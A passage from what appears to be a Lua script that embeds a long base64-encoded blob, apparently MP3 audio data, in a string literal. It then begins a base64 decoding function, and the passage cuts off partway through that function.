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
VVVVVVVVVVVVVVVVVVUAQAdVQEiMMpEyqbkTieMvMtkpI3SOVXeTop/ZGK/nK2XUAhSY07ZbX8xWkWWRtHvLfsRKuEjUCR6RpiyJyZFFykjSM/ZEqJFjTrli
KJwUmRYuaNROuNL/+3Jk84H0l2HOoYZLMgAADSAAAAEP1Y81ZgzRgAAANIAAAAQwxaPliR5F5kpIiYFAaUzJRJItE1ABHo+auqcFQAVzhECCjUcOLUxaPJLD
FUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7cGS2j/QSYMUpIzKiAAANIAAAAQAAAaQAAAAgAAA0gAAA
BFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
VVVVVVVVVVU=
	]==]
	local function DecodeBase64(data)
		local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
		local lookup = {}
		for i = 1, 64 do
			lookup[string.byte(alphabet, i)] = i - 1
		end
		data = string.gsub(data, "[^%w%+/=]", "")
		local out, n = {}, 0
		for i = 1, #data, 4 do
			local a, b, c, d = string.byte(data, i, i + 3)
			local va, vb = lookup[a], lookup[b]
			local vc, vd = c and lookup[c], d and lookup[d]
